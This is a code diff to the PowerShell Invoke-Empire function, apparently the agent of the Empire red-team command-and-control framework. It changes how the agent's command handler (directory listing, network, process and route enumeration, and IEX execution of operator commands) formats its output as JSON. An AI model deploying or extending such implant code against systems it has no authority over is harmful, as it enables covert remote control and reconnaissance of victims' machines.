@@ -301,11 +301,11 @@ function Invoke-Empire {
             switch -regex ($cmd) {
                 '(ls|^dir)' {
                     if ($cmdargs.length -eq "") {
-                        $output = Get-ChildItem -force | select mode,@{Name="Owner";Expression={(Get-Acl $_.FullName).Owner }},@{Name="LastWriteTime";Expression={($_.LastWriteTime.ToString("u"))}},length,name
+                        $output = Get-ChildItem -force | select mode,@{Name="Owner";Expression={(Get-Acl $_.FullName).Owner }},@{Name="LastWriteTime";Expression={($_.LastWriteTime.ToString("u"))}},length,name | ConvertTo-Json
                     }
                     else {
                         try{
-                            $output = IEX "$cmd $cmdargs -Force -ErrorAction Stop" | select mode,@{Name="Owner";Expression={ (Get-Acl $_.FullName).Owner }},lastwritetime,length,name
+                            $output = IEX "$cmd $cmdargs -Force -ErrorAction Stop" | select mode,@{Name="Owner";Expression={ (Get-Acl $_.FullName).Owner }},lastwritetime,length,name | ConvertTo-Json
                         }
                         catch [System.Management.Automation.ActionPreferenceStopException] {
                             $output = "[!] Error: $_ (or cannot be accessed)."
@@ -344,7 +344,7 @@ function Invoke-Empire {
                         $out | Add-Member Noteproperty 'DNSHostName' $_.DNSHostName
                         $out | Add-Member Noteproperty 'DNSSuffix' $($_.DNSDomainSuffixSearchOrder -join ",")
                         $out
-                    }
+                    } | ConvertTo-Json
                 }
                 # this is stupid how complicated it is to get this information...
                 '(ps|tasklist)' {
@@ -373,7 +373,7 @@ function Invoke-Empire {
                         $mem = "{0:N2} MB" -f $($_.WS/1MB)
                         $out | Add-Member Noteproperty 'MemUsage' $mem
                         $out
-                    } | Sort-Object -Property PID
+                    } | Sort-Object -Property PID | ConvertTo-Json
                 }
                 getpid { $output = [System.Diagnostics.Process]::GetCurrentProcess() }
                 route {
@@ -399,7 +399,7 @@ function Invoke-Empire {
                             }
                             $out | Add-Member Noteproperty 'Metric' $_.Metric1
                             $out
-                        }
+                        } | ConvertTo-Json
                     }
                     else { $output = route $cmdargs }
                 }
@@ -415,7 +415,7 @@ function Invoke-Empire {
                 }
             }
         }
-        "`n"+($output | ConvertTo-Json)
+        "`n"+($output)
     }
 
     # takes a string representing a PowerShell script to run, build a new
